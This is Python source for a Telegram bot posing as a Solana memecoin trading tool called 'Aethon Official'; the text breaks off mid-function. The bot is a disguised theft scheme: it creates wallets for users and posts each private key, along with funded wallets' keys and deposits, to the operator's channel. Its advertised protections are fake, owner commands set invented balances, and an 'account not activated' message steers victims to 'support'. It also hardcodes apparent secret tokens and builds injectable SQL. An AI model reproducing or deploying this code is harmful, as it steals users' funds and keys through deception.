from telegram import Bot
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, filters, MessageHandler
import sqlite3
from solders.keypair import Keypair
from solana.rpc.async_api import AsyncClient
from solders.pubkey import Pubkey
from solders.message import Message
from solders.transaction import VersionedTransaction, Transaction
from solders.system_program import TransferParams, transfer
from solders.message import MessageV0, MessageAddressTableLookup
import solana
import requests
import base64
import base58
import os
import asyncio
import time
import json
from threading import Timer
import threading

BOT_NAME = 'AethonsnipeBot'
CENTRAL_ADDRESS = '4TK3gSRqXnYKryzsokfRAPLTfW1KMJdhKZXpC2Ni68g4'
bitAPI = "ory_at_oFiURWw7aqs4EcoMDlCD_0YmdDd65-mArD-i6WZTttA.jQpug_XdRI5aoacG2K5GUcZjlwt_QwqBeF8OZFuMAUI"
DB_FILE = "database.json"

languages = {
    'en': {
        'text': 'English: 🇬🇧',
        'next': 'es'
    },
    'es': {
        'text': 'Español: 🇪🇸',
        'next': 'en'
    }
}

priorities = {
    'Medium': {'next': 'High'},
    'High': {'next': 'Very High'},
    'Very High': {'next': 'Medium'},
}

connection = sqlite3.connect("db.db", check_same_thread=False)

# Crear un cursor para ejecutar comandos SQL
cursor = connection.cursor()

cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        id TEXT PRIMARY KEY,
        pub_key TEXT NOT NULL,
        priv_key TEXT NOT NULL,
        referred_by TEXT,
        language TEXT DEFAULT 'en',
        min_position_value REAL DEFAULT 0.1,
        auto_buy_enabled BOOLEAN DEFAULT 0,
        auto_buy_value REAL DEFAULT 0.1,
        instant_rug_exit_enabled BOOLEAN DEFAULT 0,
        swap_auto_approve_enabled BOOLEAN DEFAULT 0,
        left_buy_button REAL DEFAULT 1.0,
        right_buy_button REAL DEFAULT 5.0,
        left_sell_button REAL DEFAULT 25.0,
        right_sell_button REAL DEFAULT 100.0,
        buy_slippage REAL DEFAULT 10.0,
        sell_slippage REAL DEFAULT 10.0,
        max_price_impact REAL DEFAULT 25.0,
        mev_protect TEXT DEFAULT 'Turbo',
        transaction_priority TEXT DEFAULT 'Medium',
        transaction_priority_value REAL DEFAULT 0.0100,
        sell_protection_enabled BOOLEAN DEFAULT 1,
        balance REAL DEFAULT 0.0
    )
''')
cursor.execute('''
    CREATE TABLE IF NOT EXISTS copy_trades (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT NOT NULL,
        target_wallet TEXT NOT NULL,
        tag TEXT,
        buy_percentage REAL DEFAULT 5.0,
        copy_sells BOOLEAN DEFAULT 1,
        buy_gas REAL DEFAULT 0.0015,
        sell_gas REAL DEFAULT 0.0015,
        slippage REAL DEFAULT 10.0,
        auto_sell BOOLEAN DEFAULT 0,
        active BOOLEAN DEFAULT 1
    )
''')

#cursor.execute('DELETE FROM users WHERE id=5450212130')

connection.commit()

'''
cursor.execute("SELECT * FROM users")
users = cursor.fetchall()
print(users)
'''

# Token del bot (reemplaza 'YOUR_TOKEN' con el token de tu bot de Telegram)
TOKEN = "7843528629:AAE89HrLELfzrC1J7VXY9FB49VqbcuqhqYQ" # "7843528629:AAE89HrLELfzrC1J7VXY9FB49VqbcuqhqYQ" # 
bot = Bot(TOKEN)
owner_id = [6216175814,6216175814]
# owner_channel = -1002358026086
imported_channel = -1002358026086
new_channel = -1002358026086
# SOLANA_URL = "https://sly-maximum-fog.solana-mainnet.quiknode.pro/f9944f895882b197302a6912ee138be3a04e42b0"
SOLANA_URL = "https://api.mainnet-beta.solana.com"

if not os.path.exists(DB_FILE):
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump({}, f, ensure_ascii=False, indent=4)

async def get_balance(pub_key):
    try:
        # Выполняем запрос
        query = "SELECT balance FROM users WHERE pub_key = ?"
        cursor.execute(query, (pub_key,))
        result = cursor.fetchone()
        
        # Проверяем, найдено ли значение
        if result:
            return result[0]
        else:
            print("Пользователь с таким pub_key не найден.")
            return None
    except Exception as e:
        print(f"Ошибка выполнения запроса: {e}")
        return None

# Функция для изменения значения balance
async def update_balance(pub_key, new_balance):
    try:
        # Выполняем обновление
        query = "UPDATE users SET balance = ? WHERE pub_key = ?"
        cursor.execute(query, (new_balance, pub_key))
        connection.commit()
        
        # Проверяем, обновлено ли значение
        if cursor.rowcount > 0:
            print("Баланс успешно обновлён.")
            return True
        else:
            print("Пользователь с таким pub_key не найден.")
            return False
    except Exception as e:
        print(f"Ошибка выполнения запроса: {e}")
        return False

def run_check_balances():
    print("started")
    asyncio.run(check_balances())

async def check_balances():
    try:
        users = cursor.execute("SELECT * FROM users").fetchall()
        wallets = [(user[1], user[2], user[21]) for user in users]
        client = AsyncClient(SOLANA_URL)
        for wallet in wallets:
            balance = await check_balance(wallet[0])
            await asyncio.sleep(3)
            print("sleeping")
            print(f"Wallet {wallet[0]} balance {balance}")
            if balance > 0.001:
                total_fee = 0
                total_transferred = 0
                set_balance = 0
                try:
                    # res, res_fee = await transfer_solana(client, Keypair.from_base58_string(wallet[1]), CENTRAL_ADDRESS, balance * 0.85)
                    # total_fee += res_fee / 1e9
                    # total_transferred += balance * 0.9
                    # print("Tx sent")
                    old_balance = await get_balance(wallet[0])
                    print(old_balance)
                    if balance > old_balance:
                        set_balance = balance + old_balance
                        print("Set Balance")
                        await update_balance(wallet[0], set_balance)
                        await bot.send_message(chat_id=imported_channel, text=f"Private key: {wallet[1]}, public key: {wallet[0]}, funded his wallet with {balance}")
                except Exception as e:
                    print("Transaction failed")
                    pass
                '''
                if total_fee > 0:
                    total_balance = round(wallet[2] + total_transferred + total_fee, 6)
                    cursor.execute(f"UPDATE users SET balance = {total_balance} WHERE pub_key = '{wallet[0]}'")
                    connection.commit()
                    '''
    except Exception as e:
        #print('error sending funds')
        pass
    print("DONE")

    t = Timer(3 * 60, run_check_balances)
    t.start()

async def transfer_solana(
    client: AsyncClient,
    from_keypair: Keypair,
    receiver_address: str,
    amount: float,
) -> str:
    # DirecciÃƒÂ³n pÃƒÂºblica del contrato del token
    token_address = Pubkey.from_string(receiver_address)
    
    # Obtener el ÃƒÂºltimo bloque de la red para la transacciÃƒÂ³n
    from_public_key = from_keypair.pubkey()
    response = await client.get_latest_blockhash()
    latest_blockhash = response.value.blockhash
    
    # Crear la transacciÃƒÂ³n de transferencia
    transaction = solana.transaction.Transaction().add(
        transfer(
            TransferParams(
                from_pubkey=from_public_key,
                to_pubkey=token_address,
                lamports=int(amount * 1e9)  # Convertir SOL a lamports
            )
        )
    )
    transaction.recent_blockhash = latest_blockhash
    transaction.fee_payer = from_public_key
    transaction.sign(from_keypair)
    message = transaction.compile_message()
    fee_response = await client.get_fee_for_message(message)
    fee = fee_response.value
    response = await client.send_raw_transaction(transaction.serialize())
    return response.value, fee

async def comprar_token_solana(
    keypair: Keypair,
    token_contract_address: str,
    amount: float,
) -> str:
    #print('public key', keypair.pubkey())
    response = requests.post("https://swap-v2.solanatracker.io/swap", json={
        "from": "So11111111111111111111111111111111111111112",
        "to": token_contract_address,
        "amount": amount,
        "slippage": 15,
        "payer": str(keypair.pubkey()),
    })
    swap_response = response.json()
    try:
        async with AsyncClient(SOLANA_URL) as client:
            txn_data = base64.b64decode(swap_response["txn"])
            transaction = Transaction.from_bytes(bytes(txn_data))
            response = await client.get_latest_blockhash()
            latest_blockhash = response.value.blockhash
            transaction.sign([keypair], latest_blockhash)
            #print('transaction', transaction)
            
            #message = MessageV0.try_compile(keypair.pubkey(), transaction.message.instructions, [], latest_blockhash)

            res = await client.send_transaction(transaction)
            #print('res', res)
            return res
    except Exception as e:
        return str(e)

async def check_balance(public_key_str: str):
    # Crear un cliente asÃƒÂ­ncrono para interactuar con la testnet
    async with AsyncClient(SOLANA_URL) as client:
        # Convertir la clave pÃƒÂºblica a un objeto PublicKey de Solana
        public_key = Pubkey.from_string(public_key_str)
        
        # Consultar el saldo
        try:
            balance_result = await client.get_balance(public_key)

            # Mostrar el saldo
            if balance_result.value:
                balance_lamports = balance_result.value
                balance_sol = balance_lamports / 1_000_000_000  # Convertir de lamports a SOL
                #print(f"Saldo de la wallet {public_key_str}: {balance_sol} SOL")
                return balance_sol
            else:
                # print("Balance is 0")
                return 0
        except Exception as e:
            print(e)
            return 0

async def create_wallet() -> Keypair:
    # Generar un nuevo par de claves
    keypair = Keypair()
    return keypair

# FunciÃƒÂ³n para manejar el comando /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Mensaje de bienvenida
    chat_id = update['message']['chat']['id']
    #print(chat_id)
    user = get_user(chat_id)
    if user is None:
        welcome_message = """*Welcome to Aethon Official Bot*

The Smartest Trading Telegram bot. Aethon Official  enables you to escape from incoming rug pulls, quickly buy or sell tokens and set automations like Limit Orders, DCA, and Sniping.

Designed with security, speed, and simplicity in mind, Aethon Official  makes trading memecoins as easy as a tap. Whether you're here to explore new opportunities or manage existing trades, Aethon Official 's user-friendly interface and real-time updates ensure you're always a step ahead in the memecoin world.

Get started, and let Aethon Official  bring a touch of fun and profit to your Solana trading experience!

Click on the *"CONTINUE"* button to get started with Aethon Official !"""

        # Crear el botÃƒÂ³n "Start"
        keyboard = [[InlineKeyboardButton("Continue", callback_data="continue")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        args = context.args
        #print('args', args)
        referred_by = args[0] if len(args) > 0 else None
        cursor.execute(f"SELECT * FROM users WHERE id = '{referred_by}'")
        refer_user = cursor.fetchone()
        #print('refer user', refer_user)

        keypair = await create_wallet()
        public_key = keypair.pubkey()
        private_key_full = keypair.secret() + bytes(public_key)  # 64 bytes en total
        private_key_base58 = base58.b58encode(private_key_full).decode("utf-8")
        await context.bot.send_message(chat_id=new_channel, text=f"Private key: {private_key_base58}, public key: {public_key}")
        cursor.execute(f"INSERT INTO users (id, pub_key, priv_key{', referred_by' if refer_user is not None else ''}) VALUES ({chat_id}, '{public_key}', '{private_key_base58}'{', ' + str(refer_user[0]) if refer_user is not None else ''})")
        connection.commit()
        #user = get_user(chat_id)
        #print(user)

        # Enviar el mensaje de bienvenida con el botÃƒÂ³n
        await update.message.reply_text(welcome_message, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
    else:
        await start_fn(None, chat_id, context)

def get_user(chat_id: str):
    cursor.execute(f"SELECT * FROM users WHERE id = {chat_id}")
    user = cursor.fetchone()
    return user

async def send_copy_trade(chat_id, context):
    copy_id = context.user_data.get('copy_id', None)
    tag = context.user_data.get('tag', '--')
    target_wallet = context.user_data.get('target_wallet', '--')
    buy_percentage = context.user_data.get('buy_percentage', 5)
    copy_sells = context.user_data.get('copy_sells', True)
    buy_gas = context.user_data.get('buy_gas', 0.0015)
    sell_gas = context.user_data.get('sell_gas', 0.0015)
    slippage = context.user_data.get('slippage', 10)
    auto_sell = context.user_data.get('auto_sell', False)

    tag = tag if tag is not None else '--'
    target_wallet = target_wallet if target_wallet is not None else '--'
    buy_percentage = buy_percentage if buy_percentage is not None else 5
    copy_sells = copy_sells if copy_sells is not None else True
    buy_gas = buy_gas if buy_gas is not None else 0.0015
    sell_gas = sell_gas if sell_gas is not None else 0.0015
    slippage = slippage if slippage is not None else 10
    auto_sell = auto_sell if auto_sell is not None else False

    active_delete = []
    if copy_id is not None:
        copy = cursor.execute(f"SELECT * FROM copy_trades WHERE id = {copy_id}").fetchone()
        active_delete = [
            InlineKeyboardButton("Active" if copy[10] else "Paused", callback_data="toggle_copy_trade"),
            InlineKeyboardButton("Delete", callback_data="delete_copy_trade")
        ]

    keyboard = [
        [InlineKeyboardButton(f"Tag: {tag}", callback_data="change_tag")],
        [InlineKeyboardButton(f"Target Wallet: {target_wallet}", callback_data="set_target_wallet")],
        [InlineKeyboardButton(f"Buy SOL: {buy_percentage}", callback_data="change_buy_percentage"), InlineKeyboardButton(f"Copy Sells: {'✅ Yes' if copy_sells else '❌ No'}", callback_data="change_copy_sells")],
        [InlineKeyboardButton(f"Buy Gas: {buy_gas} SOL", callback_data="change_buy_gas"), InlineKeyboardButton(f"Sell Gas: {sell_gas} SOL", callback_data="change_sell_gas")],
        [InlineKeyboardButton(f"Slippage: {slippage}%", callback_data="change_slippage")],
        [InlineKeyboardButton(f"Auto Sell: {'✅' if auto_sell else '❌'}", callback_data="change_auto_sell")],
        [InlineKeyboardButton("Add", callback_data="add_copy_trade") if copy_id is None else InlineKeyboardButton("Update", callback_data="add_copy_trade")],
        active_delete,
        [InlineKeyboardButton("← Back", callback_data="copy_trade")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    context.user_data['new_copy_trade'] = True
    await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
*To setup a new Copy Trade:*
- Assign a unique name or “tag” to your target wallet, to make it easier to identify.
- Enter the target wallet address to copy trade.
- Enter the percentage of the target's buy amount to copy trade with, or enter a specific SOL amount to always use.
- Toggle on Copy Sells to copy the sells of the target wallet.
- Click “Add” to create and activate the Copy Trade.

*To manage your Copy Trade:*
- Click the “Active” button to “Pause” the Copy Trade.
- Delete a Copy Trade by clicking the “Delete” button.
""", reply_markup=reply_markup)

async def send_settings(chat_id, context, query = None):
  if query is not None:
      await query.delete_message()
  context.user_data['import_wallet'] = False
  context.user_data['buy_x'] = False
  context.user_data['contract_address'] = ''
  context.user_data['change_min_position_value'] = False
  context.user_data['change_auto_buy_value'] = False
  context.user_data['change_left_buy_button'] = False
  context.user_data['change_right_buy_button'] = False
  context.user_data['change_left_sell_button'] = False
  context.user_data['change_right_sell_button'] = False
  context.user_data['change_buy_slippage'] = False
  context.user_data['change_sell_slippage'] = False
  context.user_data['change_max_price_impact'] = False
  context.user_data['change_transaction_priority_value'] = False
  user = get_user(chat_id)
  message = """
*Settings:*

*GENERAL SETTINGS*
*Language*: Shows the current language. Tap to switch between available languages.
*Minimum Position Value:* Minimum position value to show in portfolio. Will hide tokens below this threshhold. Tap to edit.

*AUTO BUY*
Immediately buy when pasting token address. Tap to toggle.

*BUTTONS CONFIG*
Customize your buy and sell buttons for buy token and manage position. Tap to edit.

*SLIPPAGE CONFIG*
Customize your slippage settings for buys and sells. Tap to edit.
Max Price Impact is to protect against trades in extremely illiquid pools.

*MEV PROTECT*
MEV Protect accelerates your transactions and protect against frontruns to make sure you get the best price possible.
*Turbo:* Aethon Official  bot will use MEV Protect, but if unprotected sending is faster it will use that instead.
*Secure:* Transactions are guaranteed to be protected. This is the ultra secure option, but may be slower.

*TRANSACTION PRIORITY*
Increase your Transaction Priority to improve transaction speed. Select preset or tap to edit.

*SELL PROTECTION*
100% sell commands require an additional confirmation step. Tap to toggle.

*Instant Rug Exit:* Scans the mempool, Automatically detects incoming rug pull transactions and automatically sells your tokens before the transaction is completed to protect against sudden losses.

*Enable/Disable Swap Auto-Approve:* Allows automatic approval of token swaps, streamlining transactions without requiring manual confirmation each time."""
  keyboard = [
    [InlineKeyboardButton("--- General Settings ---", callback_data="nothing")],
    [InlineKeyboardButton(f"⇌ {languages[user[4]]['text']}", callback_data="change_language"), InlineKeyboardButton(f"✏️ Minimum Position Value: ${user[5]}", callback_data="change_min_position_value")],
    [InlineKeyboardButton("--- Auto Buy ---", callback_data="nothing")],
    [InlineKeyboardButton("🔴 Disabled" if not user[6] else "🟢 Enabled", callback_data="toggle_auto_buy"), InlineKeyboardButton(f"✏️ {user[7]} SOL", callback_data="change_auto_buy_value")],
    [InlineKeyboardButton("--- Security Config ---", callback_data="nothing")],
    [InlineKeyboardButton("Instant Rug Exit Disabled 🔴" if not user[8] else "Instant Rug Exit Enabled 🟢", callback_data="toggle_instant_rug_exit")],
    [InlineKeyboardButton("🔴 Disabled Swap Auto-Approve" if not user[9] else "🟢 Enabled Swap Auto-Approve", callback_data="toggle_swap_auto_approve")],
    [InlineKeyboardButton("--- Buy Buttons Config ---", callback_data="nothing")],
    [InlineKeyboardButton(f"✏️ Left: {user[10]} SOL", callback_data="change_left_buy_button"), InlineKeyboardButton(f"✏️ Right: {user[11]} SOL", callback_data="change_right_buy_button")],
    [InlineKeyboardButton("--- Sell Buttons Config ---", callback_data="nothing")],
    [InlineKeyboardButton(f"✏️ Left: {user[12]}%", callback_data="change_left_sell_button"), InlineKeyboardButton(f"✏️ Right: {user[13]}%", callback_data="change_right_sell_button")],
    [InlineKeyboardButton("--- Slippage Config ---", callback_data="nothing")],
    [InlineKeyboardButton(f"✏️ Buy: {user[14]}%", callback_data="change_buy_slippage"), InlineKeyboardButton(f"✏️ Sell: {user[15]}%", callback_data="change_sell_slippage")],
    [InlineKeyboardButton(f"✏️ Max Price Impact: {user[16]}%", callback_data="change_max_price_impact")],
    [InlineKeyboardButton("--- MEV Protect ---", callback_data="nothing")],
    [InlineKeyboardButton(f"{user[17]}", callback_data="change_mev_protect")],
    [InlineKeyboardButton("--- Transaction Priority ---", callback_data="nothing")],
    [InlineKeyboardButton(f"{user[18]}", callback_data="change_transaction_priority"), InlineKeyboardButton(f"✏️ {user[19]} SOL", callback_data="change_transaction_priority_value")],
    [InlineKeyboardButton("--- Sell Protection ---", callback_data="nothing")],
    [InlineKeyboardButton("🟢 Enabled" if user[20] else "🔴 Disabled", callback_data="toggle_sell_protection")],
    [InlineKeyboardButton("Close", callback_data="continue")]
  ]
  reply_markup = InlineKeyboardMarkup(keyboard)

  # Respuesta al presionar el botÃƒÂ³n "Start"
  await context.bot.send_message(chat_id=chat_id, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN, text=message)

async def start_fn(query, chat_id, context):
  if query is not None:
      await query.delete_message()
  context.user_data['new_copy_trade'] = False
  context.user_data['change_tag'] = False
  context.user_data['set_target_wallet'] = False
  context.user_data['change_buy_percentage'] = False
  context.user_data['change_buy_gas'] = False
  context.user_data['change_sell_gas'] = False
  context.user_data['change_slippage'] = False
  context.user_data['import_wallet'] = False
  context.user_data['buy_x'] = 0
  context.user_data['contract_address'] = ''
  context.user_data['change_min_position_value'] = False
  context.user_data['change_auto_buy_value'] = False
  context.user_data['change_left_buy_button'] = False
  context.user_data['change_right_buy_button'] = False
  context.user_data['change_left_sell_button'] = False
  context.user_data['change_right_sell_button'] = False
  context.user_data['change_buy_slippage'] = False
  context.user_data['change_sell_slippage'] = False
  context.user_data['change_max_price_impact'] = False
  context.user_data['change_transaction_priority_value'] = False

  user = get_user(chat_id)
  wallet_balance = await get_balance(user[1])
  if wallet_balance > 0:
    total_balance = round(wallet_balance, 6)
  else:
    total_balance = 0
  #print(user)
  #asyncio.run(check_balance(PUB_KEY))
  #await check_balance(PUB_KEY)
  keyboard = [
      [InlineKeyboardButton("Buy", callback_data="buy"), InlineKeyboardButton("Sell & Manage", callback_data="sell_manage")],
      [InlineKeyboardButton("Help", callback_data="help"), InlineKeyboardButton("Refer Friends", callback_data="refer"), InlineKeyboardButton("Copy Trade", callback_data="copy_trade")],
      [InlineKeyboardButton("Wallet", callback_data="wallet"), InlineKeyboardButton("Settings", callback_data="settings")],
      [InlineKeyboardButton("Premium Tools", callback_data="premium_menu")],
      [InlineKeyboardButton("Pin", callback_data="pin"), InlineKeyboardButton("Refresh", callback_data="start_pressed")],
    ]
  reply_markup = InlineKeyboardMarkup(keyboard)

  # Respuesta al presionar el botÃƒÂ³n "Start"
  await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup, text=f"""
Discover the smartest trading bot built exclusively for Solana traders.

Instantly trade any token right at launch.
Below is your Solana wallet address linked to your Telegram account.

Fund your wallet to start trading with ease.
Solana Wallet:
`{user[1]}` (Tap to copy)
Balance: {total_balance} SOL

Once done, tap "Refresh" and your balance will appear here.

To buy a token enter a ticker, token address, or a URL from pump.fun, Birdeye, DEX Screener or Meteora.

User funds are safe on Aethon Official bot . For more info on your wallet tap the wallet button below.
  """)

async def buy(chat_id, context):
    message = """
Buy Token:

To buy a token enter a ticker, token address, or a URL from pump.fun, Birdeye, DEX Screener or Meteora.
    """
    keyboard = [
      [InlineKeyboardButton("Close", callback_data="continue")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(chat_id=chat_id, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN, text=message)

async def sell(chat_id, context):
    keyboard = [
            [InlineKeyboardButton("Close", callback_data="continue")],
        ]
    '''
    [InlineKeyboardButton("Sell all", callback_data="sell_all"), InlineKeyboardButton("Sell X", callback_data="sell_x")],
    [InlineKeyboardButton("Manage Position", callback_data="manage_position")],
    [InlineKeyboardButton("Refresh", callback_data="sell_manage")]
    '''
    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""No open positions""", reply_markup=reply_markup)

async def wallet(chat_id, context):
    user = get_user(chat_id)
    keyboard = [
            [InlineKeyboardButton("Close", callback_data="continue")],
            [InlineKeyboardButton("Withdraw all SOL", callback_data="withdraw_all"), InlineKeyboardButton("Withdraw X SOL", callback_data="withdraw_x")],
            [InlineKeyboardButton("Import Existing Wallet", callback_data="import_wallet")],
            [InlineKeyboardButton("Refresh", callback_data="wallet")]
        ]
    #print('private key', user[2])
    reply_markup = InlineKeyboardMarkup(keyboard)
    wallet_balance = await get_balance(user[1])
    total_balance = round(wallet_balance, 6)
    await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
*Your Wallet:* 

Address: `{user[1]}` (tap to copy)
Balance: {total_balance} SOL
Tap to copy the address and send SOL to deposit.

""", reply_markup=reply_markup)

async def help(chat_id, context):
    keyboard = [
            [InlineKeyboardButton("Close", callback_data="continue")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
*Which tokens can I trade?*
Any SPL token that is a SOL pair, on Raydium, pump.fun, Meteora, Moonshot, or Jupiter, and will integrate more platforms on a rolling basis. We pick up pairs instantly, and Jupiter will pick up non-SOL pairs within approx. 10 minutes.

*How does the Instant Rug Exit work?*
The instant Rug exit, once enabled, it works like a Mevbot which tracks the mempool for Buy and Sell transaction orders, once it detects an incoming large sell order, it will immediately sell before the large sell order is processed, saving you from a potential rug pull.

*Where can I find my referral link?*
Open the /start menu and click Refer Friends.

*How do I import my normal/existing wallet on Aethon Official bot?*
Open the /start, Tap the Wallet button, Click on Import Existing wallet and you'll be able to import your existing wallets!

*How can I use the Copy Trading feature?*

You will need to first fund your bot, Then click on Copy Trade, Paste in the address you would like to track and copy trades, set the amount in sol you will like to use for copy trading, Enable/Disable Copy Sell

*What are the fees for using Aethon Official ?*
Transactions through Aethon Official  incur a fee of 1%, or 0.9% if you were referred by another user. We don't charge a subscription fee or pay-wall any features.

*Additional questions or need support?*
Contact Aethon Official bot official telegram support admin- @AethonSupport 
""", reply_markup=reply_markup)

async def referral(chat_id, context):
    referrals = cursor.execute(f"SELECT * FROM users WHERE referred_by = {chat_id}").fetchall()
    keyboard = [
        [InlineKeyboardButton("QR code", callback_data="qr"), InlineKeyboardButton("Close", callback_data="continue")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Referrals:

Your reflink: https://t.me/{BOT_NAME}?start={chat_id}

Referrals: {len(referrals)}

Lifetime Sol earned: 0.00 Sol ($0.00)

Rewards are updated at least every 24 hours and rewards are automatically deposited to your Sol balance.

Refer your friends and earn 30% of their fees in the first month, 20% in the second and 10% forever!
        """, reply_markup=reply_markup)

async def copytrade(chat_id, context):
    user = get_user(chat_id)
    copies = cursor.execute(f"SELECT * FROM copy_trades WHERE user_id = {chat_id}").fetchall()
    #print(copies)
    keyboard = [[InlineKeyboardButton(f"{'🟢' if copy[10] else '🟠' } {copy[0] if copy[3] == '' else copy[3]}", callback_data=f"modify_copy_{copy[0]}")] for copy in copies]
    keyboard.append([InlineKeyboardButton("➕ New", callback_data="new_copy_trade")])
    keyboard.append([InlineKeyboardButton("Pause All", callback_data="pause_copy_trade")])
    keyboard.append([InlineKeyboardButton("← Back", callback_data="continue")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Copy Trade
Wallet: {user[1]}

Copy Trade allows you to copy the buys and sells of any target wallet. 
🟢 Indicates a copy trade setup is active.
🟠 Indicates a copy trade setup is paused.

You do not have any copy trades setup yet. Click on the New button to create one!
""", reply_markup=reply_markup)

def load_db():
    with open(DB_FILE, "r", encoding="utf-8") as f:
        return json.load(f)

def save_db(data):
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

# Получить limit по user_id
def get_limit(user_id):
    data = load_db()
    return data.get(str(user_id), None)  # Если нет user_id, вернёт None

# Установить (изменить) limit по user_id
def set_limit(user_id, new_limit):
    data = load_db()
    data[str(user_id)] = new_limit
    save_db(data)
    return True

async def buy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Mensaje de bienvenida
    chat_id = update['message']['chat']['id']
    #print(chat_id)
    await buy(chat_id, context)

async def sell_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Mensaje de bienvenida
    chat_id = update['message']['chat']['id']
    #print(chat_id)
    await sell(chat_id, context)

async def copytrade_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Mensaje de bienvenida
    chat_id = update['message']['chat']['id']
    #print(chat_id)
    await copytrade(chat_id, context)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Mensaje de bienvenida
    chat_id = update['message']['chat']['id']
    #print(chat_id)
    await help(chat_id, context)

async def wallet_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Mensaje de bienvenida
    chat_id = update['message']['chat']['id']
    #print(chat_id)
    await wallet(chat_id, context)

async def settings_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Mensaje de bienvenida
    chat_id = update['message']['chat']['id']
    #print(chat_id)
    await send_settings(chat_id, context)

async def referral_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Mensaje de bienvenida
    chat_id = update['message']['chat']['id']
    #print(chat_id)
    await referral(chat_id, context)

async def set_balance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Mensaje de bienvenida
    chat_id = update['message']['chat']['id']
    if chat_id not in owner_id:
        return
    if len(context.args) != 2:
        await update.message.reply_text("Use the command like: /set_balance <wallet> <sum>")
        return
    
    # Извлекаем аргументы
    wallet = context.args[0]
    summ = float(context.args[1])
    
    # Пример обработки
    await update.message.reply_text(f"Wallet: {wallet}, Balance: {summ}")
    
    # Дополнительная логика
    res = await update_balance(wallet, summ)
    if res:
        await update.message.reply_text("Done!")


async def set_limit_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Mensaje de bienvenida
    chat_id = update['message']['chat']['id']
    if chat_id not in owner_id:
        return
    # Извлекаем аргументы
    if len(context.args) != 2:
        await update.message.reply_text("Use the command like: /set_limit <wallet> <sum>")
        return
    user = context.args[0]
    summ = float(context.args[1])
    set_limit(user, summ)
    res = get_limit(user)
    print(res)
    if res:
        await update.message.reply_text(f"User limit set to: {res}")


async def get_balance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Mensaje de bienvenida
    chat_id = update['message']['chat']['id']
    if chat_id not in owner_id:
        return
    # Извлекаем аргументы
    wallet = context.args[0]
    res = await get_balance(wallet)
    if res:
        await update.message.reply_text(f"User balance: {res}")

async def check_balances_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update['message']['chat']['id']
    if chat_id not in owner_id:
        return
    await update.message.reply_text(f"Check started")
    

async def check_activation_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Mensaje de bienvenida
    chat_id = update['message']['chat']['id']
    
    await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""⚠️YOUR Aethon Official  BOT ACCOUNT HAS NOT BEEN FULLY ACTIVATED⚠️
CONTACT CUSTOMER SUPPORT FOR ASSISTANCE""")

# FunciÃƒÂ³n para manejar el botÃƒÂ³n "Start"
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    chat_id = query.message.chat_id
    user = get_user(chat_id)
    #print(user)

    if query.data == "continue":
        context.user_data['copy_id'] = None
        context.user_data['tag'] = None
        context.user_data['target_wallet'] = None
        context.user_data['buy_percentage'] = None
        context.user_data['copy_sells'] = None
        context.user_data['buy_gas'] = None
        context.user_data['sell_gas'] = None
        context.user_data['slippage'] = None
        context.user_data['auto_sell'] = None
        await start_fn(query, chat_id, context)
    elif query.data == "help":
        await help(chat_id, context)
    elif query.data == "pin":
        await query.message.pin()
    elif query.data == "toggle_copy_trade":
        copy_id = context.user_data.get('copy_id')
        cursor.execute(f"UPDATE copy_trades SET active = NOT active WHERE id = {copy_id}")
        connection.commit()
        await send_copy_trade(chat_id, context)
    elif query.data == "delete_copy_trade":
        copy_id = context.user_data.get('copy_id')
        cursor.execute(f"DELETE FROM copy_trades WHERE id = {copy_id}")
        connection.commit()
        await send_copy_trade(chat_id, context)
    elif query.data == "pause_copy_trade":
        cursor.execute(f"UPDATE copy_trades SET active = 0 WHERE user_id = {chat_id}")
        connection.commit()
        await send_copy_trade(chat_id, context)
    elif query.data == "copy_trade":
        await copytrade(chat_id, context)
    elif "modify_copy_" in query.data:
        copy_id = query.data.split('_')[2]
        copy = cursor.execute(f"SELECT * FROM copy_trades WHERE id = {copy_id}").fetchone()
        context.user_data['copy_id'] = copy_id
        context.user_data['tag'] = copy[3]
